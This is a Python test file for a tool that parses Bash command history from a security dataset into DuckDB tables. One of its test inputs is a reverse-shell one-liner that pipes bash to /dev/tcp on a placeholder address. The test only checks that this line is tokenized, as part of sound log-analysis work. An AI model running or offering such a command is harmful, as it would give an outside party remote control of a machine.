"""BOTS Bash history keeps shell syntax through the shared database writer."""

import json
from pathlib import Path

import duckdb
from test_ingest_batches import invoke


def test_history_shell_input_and_unused_tokens(tmp_path):
    """Native history and numbered variants retain full input, order and repeats."""
    native = json.loads((Path(__file__).parent / "fixtures/bots-history.json").read_text())["_raw"]
    inputs = [native, ' 17 cd ..; X=y ls "docs a" > /dev/null',
              'echo same same | cat same', 'bash -i >& /dev/tcp/192.0.2.1/4444 0>&1']
    source = f'''
from _ingest_bots import history_commands
def records(root, options):
    for index, raw in enumerate({inputs!r}):
        yield from history_commands(raw, str(index), "host:session")
    yield Command('/bin/sh', ['-c', 'echo x > y'], 'native')
'''
    database = tmp_path / "commands.duckdb"
    result = invoke(tmp_path, database, source)
    assert result.returncode == 0, result.stderr
    with duckdb.connect(str(database)) as con:
        shells = {r[0]: r[1:] for r in con.execute("SELECT record_id,shell_input,pgms,tokens FROM SHELL_INPUTS").fetchall()}
        assert con.execute("SELECT pgm,args FROM PROCESS_LAUNCHES WHERE record_id='native'").fetchone() == ('/bin/sh', ['-c', 'echo x > y'])
        assert con.execute("SELECT count(*) FROM PROCESS_LAUNCHES").fetchone() == (8,)
    assert shells["0:shell"][:2] == (native, ['ps', 'grep'])
    assert shells["1:shell"][:2] == (inputs[1].split("17 ", 1)[1], ['cd', 'ls'])
    assert shells["2:shell"][2] == ['echo', 'same', 'same', '|', 'cat', 'same']
    assert shells["3:shell"][1] == ['bash']
    assert '/dev/tcp/192.0.2.1/4444' in shells["3:shell"][2]
    assert 'native' not in shells
